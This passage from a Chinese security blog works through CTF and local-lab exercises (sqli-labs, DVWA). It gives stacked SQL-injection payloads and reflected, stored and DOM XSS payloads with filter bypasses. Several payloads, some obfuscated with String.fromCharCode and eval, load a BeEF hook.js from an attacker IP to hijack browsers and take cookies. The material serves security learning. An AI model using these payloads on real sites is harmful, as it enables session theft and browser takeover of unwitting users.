                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695195774_650aa27eb18737321a5e2.jpeg"
                      alt="图片.png"
                ></p>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><ul>
<li><p>堆叠注入就是一堆 SQL 语句一起执行。我们将多个 SQL 语句用 “;” 连接起来即可达到多条语句一起执行的效果。堆叠注入和 union 联合查询本质上都是将两条语句一起执行，但 union 查询只能连接两条查询语句，而堆叠注入可连接两条任意语句。当 WAF 没有过滤 show, rename, alert 等关键字时，可考虑堆叠注入。</p>
</li>
<li><p>例题：[强网杯 2019]随便注<br>输入<code>1&#39;;show databases;</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695196469_650aa53546795787c1a58.jpeg"
                      alt="图片.png"
                ><br>输入<code>1&#39;;show tables #</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695196646_650aa5e6393bc79d49753.jpeg"
                      alt="图片.png"
                ><br>输入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; show columns from `words`#</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695197104_650aa7b0dad99a854f5e6.jpeg"
                      alt="图片.png"
                ><br>输入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; show columns from `1919810931114514` #</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695196862_650aa6be9da5679bce968.jpeg"
                      alt="图片.png"
                ><br>输入</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; handler `1919810931114514` open as `a`; handler `a` read first limit 0,2;#</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695197353_650aa8a950d9623b3e907.jpeg"
                      alt="图片.png"
                ></p>
</li>
<li><p><a class="link"   href="https://blog.csdn.net/rainsghost/article/details/127246004" >Tips <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><code>hand tablename open as new_tablename;</code>。追加tablename的表的别名为new_tablename（需要注意的是，此处不是修改，且只在当前会话内生效）<br><code>Handler_read_next;</code>此选项表明在进行索引扫描时，按照索引从数据文件里取数据的次数。</p>
</li>
</ul>
<p>例题：sqli-labs:Less-38</p>
<p><strong><a class="link"   href="http://127.0.0.1/sqli-labs/Less-38/?id=1" >http://127.0.0.1/sqli-labs/Less-38/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/Web%E5%AE%89%E5%85%A8(0x0)SQL_injection/1695197917_650aaadd41a5591833127.jpeg"
                      alt="图片.png"
                ><br>payload:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1/sqli-labs/Less-38/?id=1&#x27;;insert into users(id,username,password) values(21,&#x27;5555&#x27;,&#x27;5555&#x27;); #</span><br></pre></td></tr></table></figure></div>



<h2 id="SQL-注入与其他漏洞结合"><a href="#SQL-注入与其他漏洞结合" class="headerlink" title="SQL 注入与其他漏洞结合"></a>SQL 注入与其他漏洞结合</h2><p>后续补充。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>SQL injection</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全-XSS跨站脚本攻击</title>
    <url>/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>XSS 指 Web 应用代码注入，攻击者向 Web 页面插入恶意 Script 代码，例如 JavaScript 脚本，CSS 或者其他代码。用户浏览该页面会执行其中嵌入的 Script 代码，从而获取 cookie，session，token或其他敏感信息，对用户进行钓鱼欺诈。</p>
<h2 id="XSS-基础"><a href="#XSS-基础" class="headerlink" title="XSS 基础"></a>XSS 基础</h2><h3 id="反射型-XSS（非持久性-XSS）"><a href="#反射型-XSS（非持久性-XSS）" class="headerlink" title="反射型 XSS（非持久性 XSS）"></a>反射型 XSS（非持久性 XSS）</h3><p>这种 XSS 并没有保存到目标网站，而是将将恶意代码放在请求的响应结果中，浏览器解析后触发 XSS，一般引诱用户点击恶意链接来实施攻击。</p>
<h5 id="dvwa-例题"><a href="#dvwa-例题" class="headerlink" title="dvwa 例题:"></a>dvwa 例题:</h5><p><strong>level: Low</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;</span><br><span class="line">    // Feedback for end user</span><br><span class="line">    echo &#x27;&lt;pre&gt;Hello &#x27; . $_GET[ &#x27;name&#x27; ] . &#x27;&lt;/pre&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>向 GET 请求注入代码:</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line">127.0.0.1/DVWA/vulnerabilities/xss_r/?name=&lt;script&gt;alert(&quot;hello&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230926211545402.png"
                      alt="image-20230926211545402"
                ></p>
<p>反馈:</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230926211722779.png"
                      alt="image-20230926211722779"
                ></p>
<p>BeEF 利用:</p>
<p>攻击方 <code>IP: 192.168.152.128</code>。</p>
<p>靶场<code>IP: 192.168.152.1</code></p>
<p>键入<code>&lt;script src=&quot;http://192.168.152.128:3000/hook.js&quot;&gt;&lt;/script&gt;</code></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927145547349.png"
                      alt="image-20230927145547349"
                ></p>
<p>反馈:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927145700059.png"
                      alt="image-20230927145700059"
                ></p>
<p><code>URL: http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=%3Cscript+src%3D%22http%3A%2F%2F192.168.152.128%3A3000%2Fhook.js%22%3E%3C%2Fscript%3E#</code></p>
<p>变成了  hook.js地址，并且成功上线 BeEF，可通过Get cookie 获取 cookie信息。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927145747630.png"
                      alt="image-20230927145747630"
                ></p>
<p>界面跳转。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927160822193.png"
                      alt="image-20230927160822193"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927160901116.png"
                      alt="image-20230927160901116"
                ></p>
<p>弹窗。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927161904804.png"
                      alt="image-20230927161904804"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927161847107.png"
                      alt="image-20230927161847107"
                ></p>
<p><strong>level: Medium</strong></p>
<p>源码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] );//str_replace 区分大小写。</span><br><span class="line"></span><br><span class="line">	// Feedback for end user</span><br><span class="line">	$html .= &quot;&lt;pre&gt;Hello &#123;$name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>payload:</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.152.128:3000/hook.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927165007670.png"
                      alt="image-20230927165007670"
                ></p>
<p><strong>level: High</strong></p>
<p>源码:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] );</span><br><span class="line">    // 避开&lt;script ,*贪婪匹配会匹配到 &lt;</span><br><span class="line"></span><br><span class="line">	// Feedback for end user</span><br><span class="line">	$html .= &quot;&lt;pre&gt;Hello &#123;$name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>只要避免 <code>script</code>出现即可。</p>
<p>策略: 使用<code>String.fromCharCode()</code>函数来创建<code>&quot;script&quot;</code>和<code>&quot;http://192.168.152.128:3000/hook.js&quot;</code>这两个字符串，以避免直接在代码中出现这些字符串。然后，我使用<code>eval()</code>函数来执行这段代码。</p>
<p>payload:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;nonexistent.jpg&quot;</span> onerror=<span class="string">&quot;eval(&#x27;var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src=String.fromCharCode(104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,49,53,50,46,49,50,56,58,51,48,48,48,47,104,111,111,107,46,106,115);document.head.appendChild(s);&#x27;)&quot;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927171112316.png"
                      alt="image-20230927171112316"
                ></p>
<p> 成功上线BeEF。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927171209443.png"
                      alt="image-20230927171209443"
                ></p>
<h3 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h3><p>存储型 XSS 被保留在目标网站中，受害者浏览包含此恶意代码的网站就会执行恶意代码。通常出现在个人信息，网站留言，评论，博客日志等交互处。</p>
<h5 id="dvwa-例题-1"><a href="#dvwa-例题-1" class="headerlink" title="dvwa 例题"></a>dvwa 例题</h5><p><strong>level: Low</strong></p>
<p>源码:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$message = trim( $_POST[ &#x27;mtxMessage&#x27; ] );</span><br><span class="line">	$name    = trim( $_POST[ &#x27;txtName&#x27; ] );</span><br><span class="line"></span><br><span class="line">	// Sanitize message input</span><br><span class="line">	$message = stripslashes( $message );</span><br><span class="line">	$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">	// Sanitize name input</span><br><span class="line">	$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">	// Update database</span><br><span class="line">	$query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;;</span><br><span class="line">	$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">	//mysql_close();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>在留言板键入 <code>&lt;script src=&quot;http://192.168.152.128:3000/hook.js&quot;&gt;</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927163730628.png"
                      alt="image-20230927163730628"
                ></p>
<p>成功上线BeEF。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927163814502.png"
                      alt="image-20230927163814502"
                ></p>
<p><strong>level: Medium</strong></p>
<p>源码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$message = trim( $_POST[ &#x27;mtxMessage&#x27; ] );</span><br><span class="line">	$name    = trim( $_POST[ &#x27;txtName&#x27; ] );</span><br><span class="line"></span><br><span class="line">	// Sanitize message input</span><br><span class="line">	$message = strip_tags( addslashes( $message ) );</span><br><span class="line">	$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">	$message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">	// Sanitize name input</span><br><span class="line">	$name = str_replace( &#x27;&lt;script&gt;&#x27;, &#x27;&#x27;, $name );</span><br><span class="line">	$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">	// Update database</span><br><span class="line">	$query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;;</span><br><span class="line">	$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">	//mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><code>str_replace</code> 可以通过双写或者大写等绕过。</p>
<p>payload:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;scrip&lt;script&gt;t&gt;<span class="attr">http</span>:<span class="comment">//192.168.152.128:3000/hook.js&lt;/scrip&lt;script&gt;t&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>限制了输入长度，将其改为 200。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927172843131.png"
                      alt="image-20230927172843131"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927173103574.png"
                      alt="image-20230927173103574"
                ></p>
<p>成功上线 BeEF。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927173151375.png"
                      alt="image-20230927173151375"
                ></p>
<p><strong>level: High</strong></p>
<p>源码:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;btnSign&#x27; ] ) ) &#123;</span><br><span class="line">	// Get input</span><br><span class="line">	$message = trim( $_POST[ &#x27;mtxMessage&#x27; ] );</span><br><span class="line">	$name    = trim( $_POST[ &#x27;txtName&#x27; ] );</span><br><span class="line"></span><br><span class="line">	// Sanitize message input</span><br><span class="line">	$message = strip_tags( addslashes( $message ) );</span><br><span class="line">	$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">	$message = htmlspecialchars( $message );</span><br><span class="line"></span><br><span class="line">	// Sanitize name input</span><br><span class="line">	$name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $name );</span><br><span class="line">	$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">	// Update database</span><br><span class="line">	$query  = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;;</span><br><span class="line">	$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">	//mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>和 xss-r 的 High 难度一样，通过编码绕过。</p>
<p>payload:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;nonexistent.jpg&quot;</span> onerror=<span class="string">&quot;eval(&#x27;var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src=String.fromCharCode(104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,49,53,50,46,49,50,56,58,51,48,48,48,47,104,111,111,107,46,106,115);document.head.appendChild(s);&#x27;)&quot;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p>修改 Message 可输入长度。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927173609007.png"
                      alt="image-20230927173609007"
                ></p>
<p>成功上线 BeEF。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927173705996.png"
                      alt="image-20230927173705996"
                ></p>
<h3 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a>DOM 型 XSS</h3><p>DOM 型 XSS 可以在前端通过 js 渲染来完成数据的交互，达到插入数据造成 XSS 脚本攻击。因 ‘#’ 后面的内容不会发送到服务器上，所以即使抓包无无法抓取到这里的流量，也不会经过服务器过滤器阻止。而反射性与存储型 XSS 需要与服务器交互，这便是三者的区别。</p>
<p><a class="link"   href="https://blog.csdn.net/qq_53577336/article/details/122441536" >DOM参考 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h5 id="dvwa-例题-2"><a href="#dvwa-例题-2" class="headerlink" title="dvwa 例题"></a>dvwa 例题</h5><p><strong>level: Low</strong></p>
<p>源码:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"># No protections, anything goes</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>select 任意一种语言后</p>
<p><code>URL: http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927184520953.png"
                      alt="image-20230927184520953"
                ></p>
<p>更改 default 参数。</p>
<p>payload:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://192.168.152.128:3000/hook.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p> 成功上线 BeEF。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927185920467.png"
                      alt="image-20230927185920467"
                ></p>
<p><strong>level: Medium</strong></p>
<p>源码:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// Is there any input?</span><br><span class="line">if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123;</span><br><span class="line">	$default = $_GET[&#x27;default&#x27;];</span><br><span class="line"></span><br><span class="line">	# Do not allow script tags</span><br><span class="line">	if (stripos ($default, &quot;&lt;script&quot;) !== false) &#123;</span><br><span class="line">		header (&quot;location: ?default=English&quot;);</span><br><span class="line">		exit;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>不允许 <code>&lt;script</code> 执行，更换闭合方式即可。</p>
<p>payload:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;<span class="regexp">/option&gt;&lt;/</span>select&gt;<span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;eval(&#x27;var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src=String.fromCharCode(104,116,116,112,58,47,47,49,57,50,46,49,54,56,46,49,53,50,46,49,50,56,58,51,48,48,48,47,104,111,111,107,46,106,115);document.head.appendChild(s);&#x27;)&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div>

<p>成功上线 BeEF。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927192547528.png"
                      alt="image-20230927192547528"
                ></p>
<p><strong>level: High</strong></p>
<p>源码:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// Is there any input?</span><br><span class="line">if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#x27;default&#x27; ]) ) &#123;</span><br><span class="line"></span><br><span class="line">	# White list the allowable languages</span><br><span class="line">	switch ($_GET[&#x27;default&#x27;]) &#123;</span><br><span class="line">		case &quot;French&quot;:</span><br><span class="line">		case &quot;English&quot;:</span><br><span class="line">		case &quot;German&quot;:</span><br><span class="line">		case &quot;Spanish&quot;:</span><br><span class="line">			# ok</span><br><span class="line">			break;</span><br><span class="line">		default:</span><br><span class="line">			header (&quot;location: ?default=English&quot;);</span><br><span class="line">			exit;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p>服务端的白名单，可用 # 绕过，# 后的 js 将在本地解析，而不会上传至服务器，并且这个脚本对以上通用。</p>
<p>payload:</p>
